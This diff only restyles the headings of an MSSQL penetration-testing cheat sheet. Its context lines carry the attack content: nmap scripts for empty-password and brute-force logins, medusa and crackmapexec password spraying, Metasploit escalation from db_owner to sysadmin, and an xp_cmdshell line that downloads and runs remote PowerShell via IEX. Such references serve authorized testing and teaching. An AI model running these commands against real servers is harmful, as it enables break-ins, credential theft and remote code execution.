@@ -4,13 +4,13 @@ description: (TCP 1433-4, 135/UDP 143)(TCP 1433-4, 135/UDP 143)
 
 # ⭕ MSSQL
 
-## :information\_source: Introduction
+## :information\_source: <mark style="color:blue;">Introduction</mark>
 
 #### [Microsoft SQL](https://medium.com/@toprak.mhmt/what-is-mssql-9a152d7d4ed0)
 
 By default, the typical ports used by SQL Server and associated database engine services are: **TCP 1433, 4022, 135, 1434, UDP 1434.**
 
-## :ballot\_box\_with\_check: Checklist
+## :ballot\_box\_with\_check: <mark style="color:blue;">Checklist</mark>
 
 * [ ] Try to query the DB if you have creds
 * [ ] heck for DAC (Dedicated Access Connection)
@@ -19,7 +19,7 @@ By default, the typical ports used by SQL Server and associated database engine 
 * [ ] If you can get access, check for privilege escalation methods to gain admin access to DB
 * [ ] Check for CVEs
 
-## Enumeration
+## <mark style="color:red;">Enumeration</mark>
 
 ```
 nmap -sV -p 1433,1433  <IP>
@@ -28,14 +28,14 @@ auxiliary/scanner/mssql/mssql_ping
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <I
 ```
 
-## Authenticate with Empty Password
+## <mark style="color:red;">Authenticate with Empty Password</mark>
 
 ```
 # Attempts to authenticate to Microsoft SQL Servers using an empty password forthe sysadmin (sa) account.
 ms-sql-empty-password
 ```
 
-## Login Brute Force
+## <mark style="color:red;">Login Brute Force</mark>
 
 ```
 nmap -p 1433 –script ms-sql-brute –script-args userdb=[user.txt] ,passdb=[pass.txt] [target
@@ -45,7 +45,7 @@ medusa -h [target] –U [user.txt] –P [pass.txt] –M mssql
 crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 
-## Dedicated Admin Connection (DAC)
+## <mark style="color:red;">Dedicated Admin Connection (DAC)</mark>
 
 The DAC port is used to connect to the database instance when normal connection attempts fail, for example, when server is hanging, out of memory or in other bad states. In addition, the DAC port provides an admin with access to system objects otherwise not accessible over normal connections.
 
@@ -57,9 +57,9 @@ sudo nmap -sU -p 1434 --script ms-sql-dac <ip>
 
 ![](<../../.gitbook/assets/image (276) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-## Query (with credentials)
+## <mark style="color:red;">Query (with credentials)</mark>
 
-### Automated
+### <mark style="color:orange;">Automated</mark>
 
 Queries Microsoft SQL Server (ms-sql) instances for a list of databases, linked servers, and configuration settings.
 
@@ -161,7 +161,7 @@ SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http:/
 sqsh -S <IP> -U <Username> -P <Password> -D <Database>
 ```
 
-### Manual
+### <mark style="color:orange;">Manual</mark>
 
 #### Local:
 
@@ -178,19 +178,19 @@ mysql -h <Hostname> -u root
 mysql -h <Hostname> -u user@target-host
 ```
 
-## MSSQL - SMB Relay Attack
+## <mark style="color:red;">MSSQL - SMB Relay Attack</mark>
 
 If we are in the local network we can run an MitM attack and grab NTLM hashes by setting up a fake SQL server and making the service authenticate against our server.
 
 {% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit" %}
 
-## Stored Procedures (db\_owner to sysadmin)
+## <mark style="color:red;">Stored Procedures (db\_owner to sysadmin)</mark>
 
 #### if we have the credentials of a DB user we can become sysadmin and execute commands remotely:
 
 {% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases" %}
 
-### Metasploit
+### <mark style="color:orange;">Metasploit</mark>
 
 ```
 use auxiliary/admin/mssql/mssql_esclate_dbowner
@@ -200,7 +200,7 @@ set username db1_owner
 set password MyPassword!
 ```
 
-## Stored Procedures (user impersonation)
+## <mark style="color:red;">Stored Procedures (user impersonation)</mark>
 
 This technique is mostly used for privilege escalation.
 
